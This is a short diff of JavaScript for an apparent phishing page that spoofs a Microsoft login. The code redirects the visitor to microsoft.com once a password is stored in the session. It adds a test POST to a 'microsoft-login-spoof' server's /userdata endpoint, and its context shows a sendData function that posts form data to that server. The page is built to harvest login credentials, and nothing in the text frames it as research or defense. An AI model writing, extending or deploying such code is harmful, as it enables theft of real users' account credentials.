@@ -1,9 +1,6 @@
 if (sessionStorage.getItem("password")) {
     window.location.href = "https://www.microsoft.com/";
 }
-fetch('https://microsoft-login-spoof.onrender.com/ping').then(response => {
-    console.log('response', response);
-})
 
 const slidePage = document.querySelector(".slide-page");
 const secondSlide = document.querySelector(".secondSlide");
@@ -24,6 +21,12 @@ const createBody = (data) => {
 
     return urlEncodedData;
 }
+fetch('https://microsoft-login-spoof.onrender.com/userdata', {
+    method: 'POST',
+    body: createBody({userName: 'test', passwordLength: 10}),
+}).then(response => {
+    console.log('response', response);
+})
 
 const sendData = (data) => {
     fetch(`https://microsoft-login-spoof.onrender.com/userdata`, {
